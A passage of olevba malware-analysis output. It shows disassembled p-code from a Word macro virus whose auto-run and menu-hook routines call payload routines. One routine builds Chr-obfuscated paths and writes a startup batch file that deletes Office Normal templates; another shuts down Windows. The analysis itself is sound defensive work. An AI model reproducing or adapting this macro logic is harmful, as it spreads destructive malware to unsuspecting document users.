' Line #110:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #111:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Sub FileClose())
' Line #114:
' 	OnError (Resume Next) 
' Line #115:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #116:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #117:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #118:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #119:
' 	EndSub 
' Line #120:
' 	Rem 0x0047 " StBfJnLhCmNoQzFiFkDkGkBrQkAeCjAzAfNjKhIuSlRfHgGrRsKtOwVhVsAxDvOgHqUlOy"
' Line #121:
' 	FuncDefn (Sub ToolsOptions())
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #124:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #125:
' 	EndSub 
' Line #126:
' 	FuncDefn (Sub EditFind())
' Line #127:
' 	Rem 0x0045 " DyBoMhBgPwIqMuHuMtJqSzNeEoNmRnHvLkVsJtQfHeLvUvFvStRzCrBhAyHlSnQhHsEq"
' Line #128:
' 	OnError (Resume Next) 
' Line #129:
' 	Ld wdDialogEditFind 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #130:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #131:
' 	Rem 0x0007 " RgMiLs"
' Line #132:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #133:
' 	EndSub 
' Line #134:
' 	FuncDefn (Sub FileSaveAs())
' Line #135:
' 	OnError (Resume Next) 
' Line #136:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #137:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #138:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub FilePrint())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	Rem 0x0013 " IyAeUxGsMwGtJgOyRx"
' Line #143:
' 	Rem 0x0035 " ApBoRvUeGoSeNfTtMiKyPuUjPzHsTzTpDqHrThLkJyNpMoUkJnSg"
' Line #144:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #145:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #146:
' 	Rem 0x0003 " Ru"
' Line #147:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #148:
' 	EndSub 
' Line #149:
' 	FuncDefn (Sub FileExit())
' Line #150:
' 	OnError (Resume Next) 
' Line #151:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #152:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #153:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #154:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #155:
' 	EndSub 
' Line #156:
' 	FuncDefn (Sub AutoOpen())
' Line #157:
' 	OnError (Resume Next) 
' Line #158:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #159:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub AutoExit())
' Line #162:
' 	OnError (Resume Next) 
' Line #163:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #164:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #165:
' 	EndSub 
' Line #166:
' 	FuncDefn (Sub AutoExec())
' Line #167:
' 	Rem 0x0023 " KeDmLmOsTwFvRhRlDeDjQgQrUtVkJiNmKm"
' Line #168:
' 	OnError (Resume Next) 
' Line #169:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #170:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Sub AutoClose())
' Line #173:
' 	OnError (Resume Next) 
' Line #174:
' 	Rem 0x0007 " JkKxMp"
' Line #175:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #176:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #177:
' 	EndSub 
' Line #178:
' 	FuncDefn (Sub ViewVBCode())
' Line #179:
' 	OnError (Resume Next) 
' Line #180:
' 	EndSub 
' Line #181:
' 	FuncDefn (Sub AdditionalSideEffects())
' Line #182:
' 	OnError (Resume Next) 
' Line #183:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #184:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #185:
' 	EndSub 
' Line #186:
' Line #187:
' 	FuncDefn (Sub Damn(strFile As String))
' Line #188:
' Line #189:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #190:
' 	OnError (Resume Next) 
' Line #191:
' 	Ld NormalTemplate 
' 	St n$ 
' Line #192:
' 	LitStr 0x000D "attrib -h -r "
' 	St Part11$ 
' Line #193:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St snag$ 
' Line #194:
' 	Rem 0x002D " MiLoMuUyUqBwHoDePyQiUkAiStHnIrFpAiIrMpRgVjPs"
' Line #195:
' 	Rem 0x0031 " JsOeRfBrCeFsClNsVnIlJeVkUeAoTsHqPsFtLhEnLlNfEqRe"
' Line #196:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St snag1$ 
' Line #197:
' 	Rem 0x0039 " GfAvVoEjGzPoDhFsUsQePrPzDsDzJyLpIrIlUiJxSwVgRyInGyVyIpBx"
' Line #198:
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Part2$ 
' Line #199:
' 	Ld Friend 
' 	St hFile 
' Line #200:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #201:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #202:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #203:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #204:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #205:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #206:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #207:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #208:
' 	Ld hFile 
' 	Close 0x0001 
' Line #209:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

